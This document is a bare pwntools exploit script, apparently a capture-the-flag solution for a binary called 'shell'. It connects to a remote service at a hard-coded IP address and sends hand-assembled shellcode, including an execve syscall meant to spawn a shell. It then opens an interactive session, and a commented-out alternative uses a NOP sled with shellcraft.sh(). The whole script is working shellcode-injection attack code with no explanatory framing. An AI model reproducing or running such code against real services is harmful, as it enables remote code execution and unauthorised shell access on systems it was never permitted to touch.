#!/bin/python3
from pwn import *

elf = context.binary = ELF('shell')
context.terminal = ["tmux", "splitw", "-h"]
p = process(elf.path)
p = remote('139.59.231.54', 9000)
#gdb.attach(p)
sc = asm("""
    mov rdx, 0x40
    lea rsi, [rbp-0x20]
    xor rdi, rdi
    syscall
""")

sc2 = asm("""
    xor rdx,rdx
    xor rsi,rsi
    mov rdi, 0x402004
    mov al, 0x3b
    syscall
""")
offset = 16
print(sc2)
p.sendline(sc2)
#p.sendline(b'\x90' *offset +  asm(shellcraft.sh()))
p.interactive() 
